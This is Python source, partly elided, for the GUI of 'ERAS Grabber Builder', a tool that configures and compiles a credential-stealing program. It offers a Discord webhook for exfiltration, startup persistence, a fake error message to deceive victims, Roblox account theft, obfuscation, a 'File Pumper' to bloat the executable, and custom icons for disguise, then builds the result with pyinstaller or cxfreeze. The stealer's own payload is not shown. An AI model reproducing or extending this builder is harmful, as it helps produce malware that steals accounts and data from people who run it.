...
class App(customtkinter.CTk):
    def __init__(self):
        ...
        self.title("ERAS Grabber Builder")
        ...
        self.logo_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "ERAS.png")), size=(60, 60))
        self.large_test_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "ERAS.png")), size=(700, 150))
        self.image_icon_image = customtkinter.CTkImage(Image.open(os.path.join(image_path, "ERAS.png")), size=(20, 20))
        ...
        self.docs_about = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "about.png")), size=(30, 30))
        self.help_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "help.png")), size=(20, 20))
        self.link_image = customtkinter.CTkImage(dark_image=Image.open(os.path.join(image_path, "link.png")), size=(20, 20))

        self.font = "Supernova"
        self.iconpath = None
        self.iconbitmap(f"{image_path}ERAS.ico")
...
################################################################################################
        ...
        self.frame_5_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="About", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.docs_about, anchor="w", command=self.docs_button_event1)
        self.frame_5_button.grid(row=3, column=0, sticky="ew")

        self.frame_about = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.frame_about.grid_columnconfigure(0, weight=2)
...
################################################################################################
        ...
        self.frame_10_button = customtkinter.CTkButton(self.navigation_frame, corner_radius=0, height=40, border_spacing=10, text="Tool rights", font=customtkinter.CTkFont(
            family=self.font, size=13), fg_color="transparent", text_color=("gray10", "gray90"), hover_color=("gray70", "gray30"), image=self.link_image, anchor="w", command=self.docs_button_event2)
        self.frame_10_button.grid(row=6, column=0, sticky="ew")

        self.second_rights = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_rights.grid_columnconfigure(0, weight=1)
        ...
        self.second_rights = customtkinter.CTkFrame(self, corner_radius=0, fg_color="transparent")
        self.second_rights.grid_columnconfigure(0, weight=2)

################################################################################################

        # Frame 1

        self.webhook_button = customtkinter.CTkEntry(self.builder_frame, width=670, height=35, font=customtkinter.CTkFont(
        ...
        self.checkwebhook_button = customtkinter.CTkButton(master=self.builder_frame, width=100, height=35, text="Check Webhook",
                                                           ...
                                                           fg_color="#828282", hover_color="#b5b5b5", font=customtkinter.CTkFont(size=15, family=self.font))
        self.checkwebhook_button.grid(row=0, sticky="ne", padx=15, pady=20)

        self.all_options = customtkinter.CTkLabel(self.builder_frame, text="Options", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        ...
        self.option_help = customtkinter.CTkButton(self.builder_frame, width=12, text="", image=self.help_image,
                                                   command=self.docs_button_event, fg_color="#828282", hover_color="#b5b5b5")
        ...
        self.ping = customtkinter.CTkCheckBox(self.builder_frame, text="Ping", font=customtkinter.CTkFont(size=17, family=self.font),
                                              command=self.check_ping, fg_color="#828282", hover_color="#b5b5b5")
        ...
        self.pingtype = customtkinter.CTkOptionMenu(
            ...
            fg_color="#828282", button_hover_color="#b5b5b5", button_color="#666464")
        ...
        self.error = customtkinter.CTkCheckBox(self.builder_frame, text="Fake Error", font=customtkinter.CTkFont(
            size=17, family=self.font), fg_color="#828282", hover_color="#b5b5b5")
        ...
        self.startup = customtkinter.CTkCheckBox(
            ...
            fg_color="#828282", hover_color="#b5b5b5")
        ...
        self.roblox = customtkinter.CTkCheckBox(self.builder_frame, text="Roblox Info", font=customtkinter.CTkFont(size=17, family=self.font),
                                                fg_color="#828282", hover_color="#b5b5b5", command=self.check_roblox)
        ...
        self.obfuscation = customtkinter.CTkCheckBox(
            ...
            fg_color="#828282", hover_color="#b5b5b5", command=self.check_cxfreeze)
        ...
        self.pump = customtkinter.CTkCheckBox(self.builder_frame, text="File Pumper", font=customtkinter.CTkFont(size=17, family=self.font),
                                              fg_color="#828282", hover_color="#b5b5b5", command=self.check_pumper)
        ...
        self.pump_size = customtkinter.CTkOptionMenu(self.builder_frame, width=30, font=customtkinter.CTkFont(
            size=17, family=self.font), values=["5mb", "10mb", "15mb", "20mb", "25mb", "30mb"], fg_color="#828282", button_hover_color="#b5b5b5", button_color="#737373")
        ...
        self.fileopts = customtkinter.CTkOptionMenu(self.builder_frame, values=["pyinstaller", "cxfreeze", ".py"],
                                                    font=customtkinter.CTkFont(size=20, family=self.font), width=70, height=45,
                                                    fg_color="#828282", button_hover_color="#b5b5b5", button_color="#737373", command=self.multi_commands)
        self.fileopts.grid(row=1, column=0, sticky="nw", padx=85, pady=340)
        self.fileopts.set("File Options")

        self.icon = customtkinter.CTkButton(self.builder_frame, width=70, text="Add Icon", fg_color="#828282", hover_color="#b5b5b5",
                                            font=customtkinter.CTkFont(size=20, family=self.font), command=self.get_icon)
        self.icon.grid(row=1, column=0, sticky="nw", padx=85, pady=430)
        self.icon.configure(state="disabled")

        self.filename = customtkinter.CTkEntry(self.builder_frame, width=105, font=customtkinter.CTkFont(size=20, family=self.font),
                                               placeholder_text="File Name")
        self.filename.grid(row=1, column=0, sticky="nw", padx=85, pady=390)

        self.build = customtkinter.CTkButton(self.builder_frame, width=500, text="Build", font=customtkinter.CTkFont(size=35, family=self.font),
                                             fg_color="#828282", hover_color="#b5b5b5", command=self.buildfile)
...
########################################################################
        ...
        self.docs = customtkinter.CTkLabel(self.frame_about, text="ABOUT ERAS", font=customtkinter.CTkFont(size=35, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=0, pady=10)


        self.docs = customtkinter.CTkLabel(self.frame_about, text="DISCORD : outdata#0\nINSTGRAM : vyb6_", font=customtkinter.CTkFont(size=17, weight="bold", family=self.font))
        self.docs.grid(row=1, column=0, sticky="n", padx=5, pady=100)
...
################################################################
    ...
    def docs_button_event1(self):
        self.select_frame_by_name("frame_5")

    def docs_button_event2(self):
        os.system("start https://vis-team.xyz/")
        os.system("cls")
    ...
    def reset_icon_button(self):
        self.icon.configure(self.builder_frame, width=250, text="Add Icon", fg_color="#828282", hover_color="#b5b5b5",
    ...
    def reset_check_webhook_button(self):
        self.checkwebhook_button.configure(fg_color="#828282", hover_color="#b5b5b5", text="Check Webhook")
    ...
    def building_button_thread(self, thread):
        while thread.is_alive():
            for i in [".", "..", "..."]:
                self.build.configure(width=250, text=f"Building{i}", font=customtkinter.CTkFont(size=35, family=self.font), fg_color="#828282", hover_color="#b5b5b5")
                time.sleep(0.3)
                self.update()
    ...
    def get_config(self):
        try:
            with open(self.basefilepath + "\\ERAS.py", 'r', encoding="utf-8") as f:
                code = f.read()
            ...
            if config_match:
                ...
                raise Exception("Could not find config in ERAS.py")
